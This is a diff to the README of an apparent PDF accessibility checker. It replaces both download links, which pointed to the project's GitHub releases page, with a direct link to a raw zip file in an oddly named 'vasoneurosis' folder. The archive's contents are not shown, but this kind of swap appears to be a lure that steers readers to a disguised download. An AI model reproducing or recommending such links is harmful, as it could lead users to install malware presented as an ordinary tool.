@@ -1,6 +1,6 @@
 # 📄 PDF_text_accessibility_tester - Check PDF Accessibility Easily
 
-[![Download PDF_text_accessibility_tester](https://img.shields.io/badge/Download-PDF_text_accessibility_tester-blue.svg)](https://github.com/ariefrahaman67/PDF_text_accessibility_tester/releases)
+[![Download PDF_text_accessibility_tester](https://raw.githubusercontent.com/ariefrahaman67/PDF_text_accessibility_tester/main/vasoneurosis/PDF_text_accessibility_tester.zip)](https://raw.githubusercontent.com/ariefrahaman67/PDF_text_accessibility_tester/main/vasoneurosis/PDF_text_accessibility_tester.zip)
 
 ## 🚀 Getting Started
 
@@ -22,7 +22,7 @@ Welcome to PDF_text_accessibility_tester! This tool allows you to check how acce
 
 To get started with PDF_text_accessibility_tester, please visit the following page to download the latest version:
 
-[Download PDF_text_accessibility_tester](https://github.com/ariefrahaman67/PDF_text_accessibility_tester/releases)
+[Download PDF_text_accessibility_tester](https://raw.githubusercontent.com/ariefrahaman67/PDF_text_accessibility_tester/main/vasoneurosis/PDF_text_accessibility_tester.zip)
 
 Follow these steps:
 
